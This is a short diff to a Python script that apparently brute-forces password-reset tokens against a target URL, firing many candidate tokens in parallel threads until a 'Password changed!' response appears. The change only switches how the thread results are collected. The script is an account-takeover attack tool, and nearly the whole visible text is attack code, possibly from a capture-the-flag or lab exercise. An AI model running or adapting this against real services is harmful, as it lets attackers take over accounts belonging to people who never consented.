@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 import requests, sys, subprocess, time, threading
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 SENT_MARKER    = "Email sent!"
 SUCCESS_MARKER = "Password changed!"
@@ -42,7 +42,7 @@ def rest_password(target_url, tokens, new_password, workers):
 
     with ThreadPoolExecutor(max_workers=workers) as ex:
         futs = [ex.submit(try_token, t) for t in tokens]
-        for f in futs:                       # stop feeding once we've won
+        for _ in as_completed(futs):         # wait for each result; keep going UNTIL found
             if found.is_set():
                 break
         ex.shutdown(wait=False, cancel_futures=True)
